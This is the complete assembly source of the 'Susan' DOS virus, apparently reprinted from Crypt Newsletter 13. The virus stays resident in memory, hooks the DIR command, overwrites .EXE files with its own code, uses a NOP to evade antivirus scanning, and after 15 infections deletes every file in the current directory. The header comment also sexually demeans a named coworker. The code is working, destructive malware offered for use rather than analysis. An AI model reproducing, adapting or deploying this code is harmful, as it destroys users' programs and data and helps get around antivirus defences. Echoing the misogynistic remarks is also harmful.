Susan virus: included in Crypt Newsletter 13

COMMENT *

     Susan Virus, Strain A
     Written by NB

     This program needs to be assembled with Turbo Assembler.
     Special thanks go to Richard S. Sadowsky of TurboPower Software
     for the help on using INT 2F with those majick functions!

     This is an example of an interesting technique for writing a virus
     that is terminate-and-stay-resident.

     Description:

        Susan is a file overwrite virus.  Named for a woman in my department
        who is overly concerned about virii, but has no idea about what the
        fuck they actually are.  She also has real nice tits.  This is a TSR
        that only infects .EXE files.  Each time the user types "DIR", the
        first .EXE file found is infected.  After 15 such infections, then
        each time DIR is typed, all files are erased in that directory.

        Infected .EXEs are destroyed and will not run.  Attempts to run them
        will display the message "Bad command or file name" message.

     Interesting Features:

         - File size and date-stamp of infected file is maintained.

         - Uses Vienna Virus technique of using the file time to determine
           if a target file is infected.

         - Infects and zaps everytime the user types a plain DIR command.

         - Hooks INT 2F for handling the DIR command.

         - Hooks INT 2F AX=010F (PRINT.COM int) to determine if the virus in
           installed in memory.

         - Writes the bug directly from memory.
*

.model small
.code

LOCALS @@

ORG             100h                   ; for COM file

DTA     STRUC                     ; used for file searching
        dtaReserved db 21 dup (0)
        dtaAttrib   db 0
        dtaTime     dw 0
        dtaDate     dw 0
        dtaSize     dd 0
        dtaName     db 13 dup (0)
DTA     ENDS

DPL     STRUC                      ; DOS Parameter List used for undoc funcs
        dplAX   DW      0
        dplBX   DW      0
        dplCX   DW      0
        dplDX   DW      0
        dplSI   DW      0
        dplDI   DW      0
        dplDS   DW      0
        dplES   DW      0
        dplCID  DW      0     ; computer ID (0 = current system)
        dplPID  DW      0     ; process ID (PSP on specified computer)
DPL     ENDS

Pointer STRUC                      ; nice structure for a pointer type
        Ofst    DW      0
        Segm    DW      0
Pointer ENDS

Start:
        JMP     Initialize

OurCommandLen   EQU     3
PathOfs         EQU     80h   ; Use command tail of PSP as path buffer
FuckMeNow       EQU     16

virSig          dw      'uS'  ; Don't delete this line...
virName         db      'san' ;      ...this is the Susan Virus!
EofMarker       db      26
OldInt2F        Pointer <>
FNameLen        db      3
FileName        db      '*.*', 0
DeleteDPL       DPL     <>
FuckCount       db      0
SaveDTA         Pointer <>
TargetMask      db      '*.EXE', 0
Victim          DTA     <>
OurCmd          db      'DIR', 0Dh

IsInfected:
        ; This will detect if the .exe is already infected.  We are using
        ; a nifty technique pulled from the Vienna Virus.  If the file's
        ; seconds is 62, then that file is infected.
        MOV     AX, Victim.dtaTime
        AND     AX, 1Fh
        CMP     AX, 1Fh  ; >60 seconds
        ; JZ  infected
        ; JNZ not infected
        RET

SearchExec:
        ; Returns AX = 1 if a uninfected file found
        XOR     CX,CX                 ; Search for an .EXE file
        MOV     DX,OFFSET TargetMask  ; DS has seg
        MOV     AH, 4Eh
        INT     21h
        JC      @@AlreadyInfected     ; No .exes in this directory

        CALL    IsInfected            ; Is this file infected?
        JNZ     @@NotInfectedYET

        ; Need to look for next file (maybe next version, haha)

@@AlreadyInfected:
        XOR     AX, AX     ; Zeros out AX 
        RET
@@NotInfectedYET:
        MOV     AX, 1      ; Return a <> Zero indicator: Boolean
        RET

CopySelf:
        MOV     DX, OFFSET Victim.dtaName  ; Open file for read/write

        MOV     AX, 4301h
        MOV     CX, 0      ; Clear all attributes to NORMAL
        INT     21h

        MOV     AH, 3Dh    ; Now open up the file... Don't worry now about nets
        MOV     AL, 2      ; read/write access
        int     21h
        MOV     BX, AX

        PUSH    CS          ; Write the virus to the start of the open file
        POP     DS
        MOV     DX,OFFSET Start                      ; Start of virus
        MOV     CX,1 + OFFSET EndOBug - OFFSET Start ; total size of virus
        MOV     AH,40h
        NOP                ; WOW! this NOP will suppresses McAfees' scan from
        INT     21h        ; thinking this is a VR [FR] virus!

        MOV     DX, Victim.dtaDate
        MOV     CX, Victim.dtaTime   ; We gotta fix up the file's datestamp
        MOV     AX, 5701h
        OR      CX, 001Fh            ; And set the time to 62 seconds!
        INT     21h                  ; ala Vienna Virus

        MOV     AH, 3Eh              ; Close up the file - we're done
        INT     21h

        RET

Manipulate:
        PUSH    AX             ; Uh...Save registers?
        PUSH    DX
        PUSH    SI
        PUSH    DI
        PUSH    DS
        PUSH    ES

        MOV     SI,CS           ; get Canonical pathname
        MOV     ES,SI
        MOV     DS,SI

        CMP     FuckCount, FuckMeNow  ; Do we start the deletes or just infect?
        JL      @@InfectCity

        MOV     DI,PathOfs
        MOV     SI,OFFSET FileName   ; Mask to delete
        MOV     AH,60h
        INT     21h

        MOV     SI,OFFSET DeleteDPL   ; Build DOS Parameter List
        MOV     [SI].dplAX,4100h
        MOV     AX,CS
        MOV     [SI].dplDS,AX
        MOV     [SI].dplDX,PathOfs
        MOV     [SI].dplES,0
        MOV     [SI].dplCID,0
        MOV     [SI].dplPID,AX

        MOV     DS,AX     ; Make DOS Server Function Call
        MOV     DX,SI
        MOV     AX,5D00h
        INT     21h

; Infect more here...
@@InfectCity:
        MOV     AH, 2FH             ; get the current DTA address
        INT     21h
        MOV     AX,ES
        MOV     SaveDTA.Segm, AX    ; Save it
        MOV     SaveDTA.Ofst, BX

        MOV     DX, OFFSET victim   ; Set DTA to this glob of memory
        MOV     AH, 1Ah
        INT     21h

        CALL    SearchExec
        CMP     AX, 0
        JZ      @@InfectNot

        CALL    CopySelf
        INC     FuckCount       ; Track the time until eating files...

        PUSH    DS                 ; Restore the DTA
        MOV     AX, SaveDTA.Segm
        MOV     DS, AX
        MOV     DX, SaveDTA.Ofst
        MOV     AH, 1Ah
        INT     21h
        POP     DS

; And return to the way it was...
@@InfectNot:
        POP     ES
        POP     DS
        POP     DI
        POP     SI
        POP     DX
        POP     AX

; If you want the DOS command to not execute, then you just need to uncomment
; out the next line:

;       MOV     BYTE PTR [SI],0          ; clear out the command string

        RET

; convert pascal style string in DS:SI to uppercase
UpperCaseSt:
        PUSH    CX
        PUSH    SI
        XOR     CX,CX
        MOV     CL,BYTE PTR [SI]
@@UpcaseCh:                         ; Oh well, not too hard...
        INC     SI
        CMP     BYTE PTR [SI],'a'
        JB      @@NotLower
        CMP     BYTE PTR [SI],'z'
        JA      @@NotLower
        SUB     BYTE PTR [SI],'a' - 'A'
@@NotLower:
        LOOP    @@UpcaseCh
        POP     SI
        POP     CX
        RET

; zf set if match, zf not set if no match
IsMatch:
        ; NOTE: ds:bx has command line
        ;       ofs 0 has max length of command line
        ;       ofs 1 has count of bytes to follow command line text,
        ;         terminated with 0Dh
        PUSH    CX
        PUSH    SI
        PUSH    DI
        PUSH    ES
        MOV     SI,BX
        INC     SI
        CALL    UpperCaseSt
        INC     SI
        MOV     CX,CS
        MOV     ES,CX
        MOV     DI,OFFSET OurCmd
        MOV     CX,OurCommandLen + 1
        CLD
        REPE    CMPSB
        POP     ES
        POP     DI
        POP     SI
        POP     CX
        RET

IsMatch2:
        PUSH    CX
        PUSH    SI
        PUSH    DI
        PUSH    ES
        XOR     CX,CX
        MOV     CL,BYTE PTR [SI]
        INC     SI
        CMP     CL,OurCommandLen
        JNZ     @@NotOurs
        MOV     DI,CS
        MOV     ES,DI
        MOV     DI,OFFSET OurCmd
        CLD
        REPE    CMPSB
@@NotOurs:
        POP     ES
        POP     DI
        POP     SI
        POP     CX
        RET

Int2FHandler:
        CMP     AX, 010Fh      ; Am I installed?
        JNZ     CheckCmd
        MOV     AX, virSig
        IRET
CheckCmd:
        CMP     AH,0AEh        ; a nifty-c00l majick function
        JNE     @@ChainInt2F
        CMP     AL,0
        JE      @@CheckCommand
        CMP     AL,1
        JE      @@ExecuteCommand
@@ChainInt2F:
        JMP     DWORD PTR CS:[OldInt2F]

@@CheckCommand:                  ; Dos is checking if we are a valid command
        CMP     DX,0FFFFh
        JNE     @@ChainInt2F
        CALL    IsMatch
        JNZ     @@ChainInt2F
        MOV     AL,0FFh
        IRET

@@ExecuteCommand:                ; Dos says "yup! - Execute it!"
        CMP     DX,0FFFFh
        JNE     @@ChainInt2F
        CALL    IsMatch2
        JNZ     @@ChainInt2F
        CALL    Manipulate
        IRET

Initialize:
        MOV     FuckCount, 0  ; Clear it since we may have written junk

        MOV     DX,OFFSET InstallMsg
        MOV     AH,09h
        INT     21h

        MOV     AH,30h               ; Check DOS version >= 3.3
        INT     21h
        XCHG    AH,AL
        CMP     AX,0303h
        JB      @@InstallBad

        ; NOTE: This checks to see if we are already installed in memory.
        ;       Basically, we have added a new subfunction to the PRINT funcs
        ;       which returns my initials if installed.
        MOV     AX, 010Fh            ; Check if we are installed
        INT     2Fh
        CMP     AX, virSig
        JZ      @@InstallBad

        MOV     AX,352Fh              ; Lets get and save int 2F
        INT     21h
        MOV     OldInt2F.Ofst,BX
        MOV     OldInt2F.Segm,ES
        MOV     DX,OFFSET Int2FHandler  ; And set it to ours
        MOV     AX,252Fh
        INT     21h
        MOV     SI,2Ch
        MOV     AX,[SI]                  ; get segment of env's memory
        MOV     ES,AX
        MOV     AH,49h                   ; release environment block's memory
        INT     21h

        ; NOTE: Normally, we would have something like OFFSET INITIALIZE but
        ;       since we want to write the code from memory to disk, we have to
        ;       keep the whole thing in memory.
        MOV     DX,OFFSET EndOBug
        ADD     DX,15
        MOV     CL,4
        SHR     DX,CL
        MOV     AX,3100h
        INT     21h        ; Terminate and stay resident!

@@InstallBad:
        MOV     AX,4C00h  ; Just quit with no message - no sense telling what
        INT     21h       ; may have occured...

InstallMsg:
        db      'Bad command or file name', 0Dh, 0Ah
EndOBug db      '$'  ; Very important (tho lame) - Do not remove!

_TEXT           ENDS
                END     Start
